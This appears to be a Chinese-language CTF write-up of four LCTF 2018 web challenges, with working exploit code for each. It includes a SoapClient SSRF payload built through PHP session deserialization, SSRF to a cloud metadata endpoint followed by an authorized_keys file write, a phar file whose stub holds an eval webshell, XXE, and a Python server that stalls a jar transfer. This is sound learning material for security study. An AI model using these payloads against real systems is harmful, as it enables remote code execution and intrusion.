---
title: 2018 lctf-web 学习篇
date: 2018-11-19 20:34:47
tags:
	- writeup
	- lctf
---

# 前言

题目很给力，能学到很多，而且做起来没有什么弯弯绕绕的东西，一般都直接给了代码

但就是代码都给了，然后无从下手，第一天对着代码发呆了一天，打自闭了。。。

赛后疯狂学习一波。

# bestphp's revenge

代码量不多，直接贴上来

```php
<?php
highlight_file(__FILE__);
$b = 'implode';
call_user_func($_GET[f],$_POST);
session_start();
if(isset($_GET[name])){
    $_SESSION[name] = $_GET[name];
}
var_dump($_SESSION);
$a = array(reset($_SESSION),'welcome_to_the_lctf2018');
call_user_func($b,$a);
?>
```

还有一个flag.php

```php
session_start();
echo 'only localhost can get flag!';
$flag = 'LCTF{*************************}';
if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){
       $_SESSION['flag'] = $flag;
   }
only localhost can get flag!
```

很明显需要一个SSRF（或者直接getshell?），难点在`call_user_func`的第二个参数传入了一个`$_POST`数组
直接传数组的函数确实想不起来几个，更别提什么危险函数了

做到下午给了个反序列化的提示，就知道应该和SOAP这个原生类有关系，但还是不知道怎么触发

就不多bb自己辛酸的解题史了（反正最后也没做出来），直接说下正确的解法

## SESSION反序列化

以前一直都知道session是通过反序列化的方式存放在一个临时文件中的，本来想具体研究一下的，但由于懒也没深究了

可以参考 https://blog.spoock.com/2016/10/16/php-serialize-problem/

里面提到，有三种存放session的方式，对应着phpinfo中的`session.serialize_handler`

- **php** (默认):	key|$serialize
  键名+竖线+经过serialize()函数序列处理的值
  例如：name|s:6:"kingkk";
- **php_serialize**:	$serialize
  经过serialize()函数序列化处理的值
  例如：a:1:{s:4:"name";s:6:"kingkk";}
- **php_binary**:	ascii(len) key $serialize()
  键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值
  例如：names:6:"kingkk"     //第一个字符为chr(6)

当在不同的`serialize_handler`中切换的时候，会产生一个安全问题

例如当一开始是以`php_serialize`方式存储之后，在字符串中间添加了一个`|`
第二次以`php`方式进行反序列化，只要控制`|`后面的字符传为一个反序列化字符串，就会自动进行反序列化

虽然最后会有一个不可控的`";}`结尾字符，但是亲测反序列化字符后面可以添加一些脏字符，但是前面不行

## Soap SSRF

作为一个php的原生类，反序列化时可以利用SOAP进行SSRF攻击，还能进行`CRLF`注入，

有wupco师傅和柠檬的文章中写的蛮详细的了，我就不复述了

https://xz.aliyun.com/t/2148#toc-0

https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0

原生类解决了很多找不到类的情况的麻烦，但是利用Soap进行SSRF也有两个需要注意的点

- Soap不是默认开启的，需要手动开启
- 需要触发`__call`方法才能进行SSRF

## 回到题解上

查看`session_start`的官方文档就可以看到，允许其中传入一个数组，来设置`session.`的一些参数

![](2018-lctf-web-学习篇\1.png)

这样，我们就可以利用`call_user_func($_GET[f],$_POST);`来设置`session.serialize_handler`的值，从而进行Soap的反序列化

```php
<?php
$a = new SoapClient(null, array(
	'location' => "http://127.0.0.1/flag.php",
	'user_agent' => "AAA:BBB\r\n"."Cookie:PHPSESSID=22704eeclr7famlh9s21m9to26",
	'uri' => "123"
));
$s = serialize($a);
echo urlencode($s);
```

```
http://172.81.210.82/?f=session_start&name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2Flocalhost%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Db8govp8041cfm1cb307bsf66v3%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D

serialize_handler=php_serialize
```

提交之后，就能看到，这里以`php_serialize`模式保存session的时候，会显示`name`的value值是一个序列化字符串

![](2018-lctf-web-学习篇\2.png)

当我们直接访问这个页面，也就是以`php`的默认模式开启session的时候，就可以

![](2018-lctf-web-学习篇\3.png)

就可以看到，这里将`|`后面的反序列化字符串，反序列化成了一个`Soap`类

要触发`Soap`的SSRF，还得需要触发它的`__call`方法，这样我们就可以尝试利用`extract`覆盖掉变量`$b`
去调用一个不存在的方法，就会触发SSRF

```
http://172.81.210.82/?f=extract&name=Soapclient

b=call_user_func
```

这样，就可以让Soap带上自己的Cookie去访问flag.php，再次刷新页面，就可以看到flag了

![](2018-lctf-web-学习篇\4.png)

# Travel

## 题解

自己一开始做的时候也是万脸懵逼，不知道干嘛。题目一开始就给了源码

```python
# -*- coding: utf-8 -*-

from flask import request, render_template
from config import create_app
import os
import urllib
import requests
import uuid

app = create_app()

@app.route('/upload/<filename>', methods = ['PUT'])
def upload_file(filename):
    name = request.cookies.get('name')
    pwd = request.cookies.get('pwd')
    if name != 'lctf' or pwd != str(uuid.getnode()):
        return "0"
    filename = urllib.unquote(filename)
    with open(os.path.join(app.config['UPLOAD_FOLDER'], filename), 'w') as f:
        f.write(request.get_data(as_text = True))
        return "1"
    return "0"

@app.route('/', methods = ['GET'])
def index():
    url = request.args.get('url', '')
    if url == '':
        return render_template('index.html')
    if "http" != url[: 4]:
        return "hacker"
    try:
        response = requests.get(url, timeout = 10)
        response.encoding = 'utf-8'
        return response.text
    except:
        return "Something Error"

@app.route('/source', methods = ['GET'])
def get_source():
    return open(__file__).read()

if __name__ == '__main__':
    app.run()
```

就两个页面，一个是`/`，一个python的SSRF，并且必须以`http`开头

还有一个就是`/upload/<filename>`，一个比较有意思的是他只允许`PUT`的传入方式
需要知道`uuid.getnode()`的值（也就是mac地址的值）才可以任意文件写入

出题人给了一个提示

```
hint2: 留意云服务商和差异性
```

emm，只能说我是想不到，但是还是比较贴近实战的一种信息搜集方式

可以看到比赛的服务器是用的腾讯云，查看腾讯云的文档

https://cloud.tencent.com/document/product/213/4934

![](2018-lctf-web-学习篇\5.png)

可以看到可以通过访问 http://metadata.tencentyun.com/latest/meta-data/mac  来获取本机的mac地址

这样的话就可以利用那个python的SSRF来获取mac地址

获取到mac地址之后，就可以进行`/upload/`页面的任意文件写入了

但是在nginx中禁用了PUT方法，复现到这里的时候平台已经关了，可以来看下给出的源码

```nginx
location / {
    if ($request_method !~* GET|POST|HEAD) {
        return 405;
    }
    include /etc/nginx/uwsgi_params;
    uwsgi_pass 127.0.0.1:8000;
}
```

很明显不允许`	PUT`方法访问，会抛出一个405的异常

然后查看flask的文档可以发现，flask可以允许自定义HTTP方式

http://flask.pocoo.org/docs/1.0/patterns/methodoverrides/

设置的方式如下

```python
class HTTPMethodOverrideMiddleware(object):
    allowed_methods = frozenset([
        'GET',
        'HEAD',
        'POST',
        'DELETE',
        'PUT',
        'PATCH',
        'OPTIONS'
    ])
    bodyless_methods = frozenset(['GET', 'HEAD', 'OPTIONS', 'DELETE'])

    def __init__(self, app):
        self.app = app

    def __call__(self, environ, start_response):
        method = environ.get('HTTP_X_HTTP_METHOD_OVERRIDE', '').upper()
        if method in self.allowed_methods:
            method = method.encode('ascii', 'replace')
            environ['REQUEST_METHOD'] = method
        if method in self.bodyless_methods:
            environ['CONTENT_LENGTH'] = '0'
        return self.app(environ, start_response)
```

可以通过传入`HTTP_X_HTTP_METHOD_OVERRIDE`的头部，来重写请求方式（在给出的源码中确实也是那么写的

这样，就可以利用这个`PUT`的任意文件写入，往`/home/lctf/.ssh/authorized_keys`中写入公钥，从而cat flag（感觉有点偏脑洞把。环境关了也就暂时不复现了。

## 一些题外话

阿里云其实也有这样类似于腾讯云的api，做信息搜集的时候可能会有点用把

https://help.aliyun.com/knowledge_detail/49122.html

最后写文件的地方，一般有三种思路把（类似于redis的写文件

- 写公钥
- 写cron定时任务
- 写webshell 

其次的话，可以看下端口？假如开了22，那写公钥似乎就是一个比较明显的提示了

# sh0w m3 the sh31l

模改的hitcon2017的反序列化

```php
<?php 

$SECRET  = `../read_secret`;                                  
$SANDBOX = "../data/" . md5($SECRET. $_SERVER["REMOTE_ADDR"]); 
$FILEBOX = "../file/" . md5("K0rz3n". $_SERVER["REMOTE_ADDR"]);    
@mkdir($SANDBOX); 
@mkdir($FILEBOX); 

if (!isset($_COOKIE["session-data"])) { 
    $data = serialize(new User($SANDBOX)); 
    $hmac = hash_hmac("md5", $data, $SECRET); 
    setcookie("session-data", sprintf("%s-----%s", $data, $hmac));       
} 

class User { 
    public $avatar; 
    function __construct($path) { 
        $this->avatar = $path;
    } 
} 

class K0rz3n_secret_flag { 
    protected $file_path; 
    function __destruct(){ 
        if(preg_match('/(log|etc|session|proc|read_secret|history|class)/i', $this->file_path)){ 
            die("Sorry Sorry Sorry"); 
        } 
    include_once($this->file_path); 
 } 
} 


function check_session() { 
    global $SECRET; 
    $data = $_COOKIE["session-data"]; 
    list($data, $hmac) = explode("-----", $data, 2); 
    if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac)){ 
        die("Bye"); 
    } 
    if ( !hash_equals(hash_hmac("md5", $data, $SECRET), $hmac) ){ 
        die("Bye Bye"); 
    } 
    $data = unserialize($data); 
    if ( !isset($data->avatar) ){ 
        die("Bye Bye Bye"); 
    } 
    return $data->avatar;                                               
} 

function upload($path) { 
    if(isset($_GET['url'])){ 
         if(preg_match('/^(http|https).*/i', $_GET['url'])){ 
            $data = file_get_contents($_GET["url"] . "/avatar.gif");                         
            if (substr($data, 0, 6) !== "GIF89a"){ 
                die("Fuck off"); 
            } 
            file_put_contents($path . "/avatar.gif", $data); 
            die("Upload OK"); 
        }else{ 
            die("Hacker"); 
        }            
    }else{ 
        die("Miss the URL~~"); 
    } 
} 

function show($path) { 
    if ( !is_dir($path) || !file_exists($path . "/avatar.gif")) {             
        $path = "/var/www"; 
    } 
    header("Content-Type: image/gif"); 
    die(file_get_contents($path . "/avatar.gif"));                     
} 

function check($path){ 
    if(isset($_GET['c'])){ 
        if(preg_match('/^(ftp|php|zlib|data|glob|phar|ssh2|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file)(.|\\s)*/i',$_GET['c'])){ 
            die("Hacker Hacker Hacker"); 
        }else{ 
            $file_path = $_GET['c']; 
            list($width, $height, $type) = @getimagesize($file_path); 
            die("Width is ：" . $width." px<br>" . 
                "Height is ：" . $height." px<br>"); 
        } 
    }else{ 
        list($width, $height, $type) = @getimagesize($path."/avatar.gif"); 
        die("Width is ：" . $width." px<br>" . 
            "Height is ：" . $height." px<br>"); 
    } 
} 

function move($source_path,$dest_name){ 
    global $FILEBOX; 
    $dest_path = $FILEBOX . "/" . $dest_name; 
	if(preg_match('/(log|etc|session|proc|root|secret|www|history|file|\.\.|ftp|php|phar|zlib|data|glob|ssh2|rar|ogg|expect|http|https)/i',$source_path)){ 
        die("Hacker Hacker Hacker"); 
    }else{ 
        if(copy($source_path,$dest_path)){ 
            die("Successful copy"); 
        }else{ 
            die("Copy failed"); 
        } 
    } 
} 

$mode = $_GET["m"]; 

if ($mode == "upload"){ 
     upload(check_session()); 
} 
else if ($mode == "show"){ 
    show(check_session()); 
} 
else if ($mode == "check"){ 
    check(check_session()); 
} 
else if($mode == "move"){ 
    move($_GET['source'],$_GET['dest']); 
} 
else{      
    highlight_file(__FILE__);     
} 

include("./comments.html"); 
```

重点放在upload和check函数上，可以直接从过滤中看到

```php
if(preg_match('/^(ftp|php|zlib|data|glob|phar|ssh2|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file)(.|\\s)*/i',$_GET['c']))
```

check中禁用了一些php的伪协议，尤其是`phar`，但是这里可以通过`compress.zlib://phar:`方式绕过

然后后面通过`@getimagesize($file_path)`就可以触发phar反序列化

phar文件自然是通过`upload`方式传上去的

```php
if(preg_match('/^(http|https).*/i', $_GET['url'])){ 
    $data = file_get_contents($_GET["url"] . "/avatar.gif");                         
    if (substr($data, 0, 6) !== "GIF89a"){ 
        die("Fuck off"); 
    } 
    file_put_contents($path . "/avatar.gif", $data); 
```

可以看到是只要文件头以`GIF89a`开头，然后就可以从远程服务器中下载图片到自己的data沙箱中

于是构造phar文件（文件路径在cookie中可以看到

```php
<?php
class K0rz3n_secret_flag {
	function __construct(){
		$this->file_path = '/var/www/html/show_me_shell/data/8296a7decb7606bc224d78d13afaf8df/avatar.gif';
	} 
}
@unlink("1.phar");
$phar = new Phar("1.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub('GIF89a<?php echo 1;eval($_GET["a"]);?><?php __HALT_COMPILER(); ?>'); //设置stub
$o = new K0rz3n_secret_flag();
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
```

然后改名为`avatar.gif`让题目下载就可以了

![](2018-lctf-web-学习篇\6.png)

下载到之后，就可以利用phar进行反序列化

```
http://192.168.85.128/show_me_shell/html/LCTF.php?m=check&c=compress.zlib://phar:///var/www/html/show_me_shell/data/8296a7decb7606bc224d78d13afaf8df/avatar.gif/test.txt&a=phpinfo(); 
```

就可以rce了，第一题也就到这结束了

![](2018-lctf-web-学习篇\7.png)

# sh31l 4ga1n

## XXE

第一题的升级版，最主要的一个特征就是，在`K0rz3n_secret_fla`类中过滤了`data`

```php
class K0rz3n_secret_flag {
    protected $file_path;
    function __destruct(){
        if(preg_match('/(log|etc|session|proc|data|read_secret|history|class|\.\.)/i', $this->file_path)){
            die("Sorry Sorry Sorry");
        }
	include_once($this->file_path);
 }
}
```

这样就不能反序列化`data`目录下的文件，move也不能移动`data`目录下的文件，至于非预期解的问题最后再说，因为预期解中有蛮多值得学习的地方还是

在留言的部分抓包后可以发现其实是往8080的一个api目录发送的数据包

![](2018-lctf-web-学习篇\8.png)

8080一般是tomcat的默认端口，我们可以猜测这是一个java服务。对json的数据进行了一些过滤，但是我们可以尝试直接发送一个xml（注意改下`Content-Type`

![](2018-lctf-web-学习篇\9.png)

发现也是可以解析的，虽然不能用`file`协议，但是可以利用外部实体，列目录（出题人是用的netdoc协议，但是本地貌似没有这个协议

![](2018-lctf-web-学习篇\10.png)

## jar协议

由于提示了需要getshell，已经把flag放在了一个比较隐藏的目录中，需要要一些系统命令来查找flag

然后就是一个getshell的思路

> java 的 jar:// 协议，通过这个协议我们能向远程服务器去请求文件（没错是一个远程的文件，这相比于 php 的 phar 只能请求本地文件来说要强大的多），并且在传输过程中会生成一个临时文件在某个临时目录中

可以利用jar协议，请求一个远程文件，并会生成一个tmp文件，但是和php一样，这个tmp文件只在这次请求的周期中存在，并且不可预测。

但是我们这里有一个列目录的功能，我们可以通过XXE来获取到文件名，但是还有个小问题就是，一次请求的时间相当短，难以在这极短的时间内完成文件的move。这里出题人给出了这样一个思路

> 实际上我们可以通过自己写服务器端的方法完成这个功能，因为文件本身就在自己的服务器上，我想让他怎么传不是完全听我的？于是我写了一个简单的 TCP 服务器，这个服务器的特点就是在传输到文件的最后一个字节的时候突然暂停传输，我使用的是 sleep() 方法，这样就延长了时间，而且是任意时间的延长，但是实际上这厉害牵扯出一个问题，就是我们这样做文件实际上是不完整的，所以我们需要精心构造一个 payload 文件，这个文件的特点就是我在最后一个字节的后面又添加了一个垃圾字节，这样实际上在暂停过程中文件已经传输完毕了，只是服务器认为没有成功传输而已

只要自己利用socket伪造一个文件传输器，发送完phar部分的文件之后，就进入阻塞，这也就可以把这次请求的周期极大的放大。就有足够的时间给我们转移文件，进而反序列化getshell

```python
import sys 
import time 
import threading 
import socketserver 
from urllib.parse import quote 
import http.client as httpc 

listen_host = '0.0.0.0' 
listen_port = 23333
jar_file = sys.argv[1]

class JarRequestHandler(socketserver.BaseRequestHandler):  
    def handle(self):
        http_req = b''
        print('New connection:',self.client_address)
        while b'\r\n\r\n' not in http_req:
            try:
                http_req += self.request.recv(4096)
                print('\r\nClient req:\r\n',http_req.decode())
                jf = open(jar_file, 'rb')
                contents = jf.read()
                headers = ('''HTTP/1.0 200 OK\r\n'''
                '''Content-Type: application/java-archive\r\n\r\n''')
                self.request.sendall(headers.encode('ascii'))
                self.request.sendall(contents[:-1])
                time.sleep(300)
                print(30)
                self.request.sendall(contents[-1:])

            except Exception as e:
                print ("get error at:"+str(e))


if __name__ == '__main__':

    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) 
    print ('waiting for connection...') 
    server_thread = threading.Thread(target=jarserver.serve_forever) 
    server_thread.daemon = True 
    server_thread.start() 
    server_thread.join()
```

需要在phar文件末尾添加一些额外字符

![](2018-lctf-web-学习篇\11.png)

然后放在服务器中进行请求

![](2018-lctf-web-学习篇\1.gif)

就可以找到临时文件名，然后利用move函数进行转移

```
http://192.168.85.144/again/html/LCTF.php
?m=move
&source=/tmp/tomcat8-tomcat8-tmp/jar_cache10508780857600852519.tmp
&dest=jar.zip
```

emm，本地复现的时候遇到了一个小问题就是，apache的用户是`www-data`，tomcat的运行用户是`tomcat`这样就导致无法利用php移动tomcat的临时文件，不过比赛的时候应该权限已经配好了把。

到这后面也就差不多了，文件被移动到file目录下之后，就和之前一样phar反序列化包含就行了

## 一些非预期

第一题的非预期似乎是没有注意到cookie中可以获取到文件的路径，所以可以看到第一题中很多功能都没用到

第二题的话听说一开始将`$SECRET`设置成了一个NULL值，就可以伪造签名，从而getshell了

而且我也觉得XXE之后真的要getshell，我也会去尝试读取`read_secret`文件内容，反正DTD在我远程服务器，也不受什么限制，进而伪造签名

但是预期解中还是有很多值得学习的地方的，但是感觉可能因为写的有点偏复杂了，就导致了很多没有预期到的结果。总之还是很值得学习的一道题。






# 最后

一开始打的时候真的打自闭了，和劝退赛一样，不过赛后确实学到了很多东西，膜一波l-team的师傅们

自己真的还差的很远，接下来两件事

- 学java
- 学会看文档

# References

http://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/#footer

https://xz.aliyun.com/t/3341#toc-20

https://www.anquanke.com/post/id/164569















